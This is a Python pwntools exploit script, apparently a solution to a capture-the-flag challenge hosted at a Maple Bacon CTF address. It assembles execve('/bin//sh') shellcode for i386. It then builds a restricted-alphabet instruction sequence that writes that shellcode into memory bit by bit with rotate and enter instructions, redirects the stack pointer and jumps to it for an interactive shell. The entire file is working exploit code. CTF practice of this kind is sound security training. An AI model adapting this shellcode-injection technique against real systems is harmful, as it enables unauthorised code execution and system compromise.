from pwn import *
context.update(arch="i386", os="linux")
context.log_level = 'debug'
import sys

rcl_ecx_1 = 'JJ'
rcl_edx_1 = 'JK'
rcl_ebx_1 = 'JL'
rcl_esp_1 = 'JM'
rcl_ebp_1 = 'JN'
rcl_esi_1 = 'JO'
rcl_edi_1 = 'JP'
rcr_eax_1 = 'JQ'
rcr_ecx_1 = 'JR'

rol_ecx_1 = 'JA'
rol_edx_1 = 'JB'
rol_ebx_1 = 'JC'
rol_esp_1 = 'JD'
rol_ebp_1 = 'JE'
rol_esi_1 = 'JF'
rol_edi_1 = 'JG'
ror_eax_1 = 'JH'
ror_ecx_1 = 'JI'

neg_al = '6Q'
not_dh = '6O'
shr_eax_1 = '33JY'
rcl_ah_cl = 'KM'
mov_cl_F1 = 'FA1'
mov_cl_F2 = 'FA2'
shr_ecx_1 = 'JR'
mov_dl_F7 = 'FB7'
enter = 'HAAA'

shellc2 = asm('''
  push 11
  pop eax
  push   ebx
  push   0x68732f2f
  push   0x6e69622f
  mov    ebx,esp
  xor ecx,ecx
  int    0x80
''')

print(hexdump(shellc2))
set_esp_1 = mov_cl_F1 + shr_ecx_1 + rcl_esp_1
set_esp_0 = mov_cl_F2 + shr_ecx_1 + rcl_esp_1

set_ebp_1 = mov_cl_F1 + shr_ecx_1 + rcl_ebp_1
set_ebp_0 = mov_cl_F2 + shr_ecx_1 + rcl_ebp_1

shellcode = ''

def write(addr, value):
  global shellcode
  for i in range(32):
    if (addr & (1<<(31-i))):
      shellcode += set_esp_1
    else:
      shellcode += set_esp_0
  for i in range(32):
    if (value & (1<<(31-i))):
      shellcode += set_ebp_1
    else:
      shellcode += set_ebp_0
  shellcode += enter

dest = 0x8048000 + 0xc200

# write shellcode to memory with enter
write(dest+4+0x10, u32(shellc2[0x10:0x14]))
write(dest+4+0x0c, u32(shellc2[0x0c:0x10]))
write(dest+4+0x08, u32(shellc2[0x08:0x0c]))
write(dest+4+0x04, u32(shellc2[0x04:0x08]))
write(dest+4, u32(shellc2[0:0x4]))

# set esp to shellcode pointer before it
addr = 0x080541fc
for i in range(32):
  if (addr & (1<<(31-i))):
    shellcode += set_esp_1
  else:
    shellcode += set_esp_0
# jump to shellcode
shellcode += 'C'	# ret

if args.REMOTE:
  p = remote('ebcsic.ctf.maplebacon.org', 1337)
else:
  p = process('python3 ./chal.py', shell=True)

p.sendlineafter('shellcode: ', shellcode)


p.interactive()


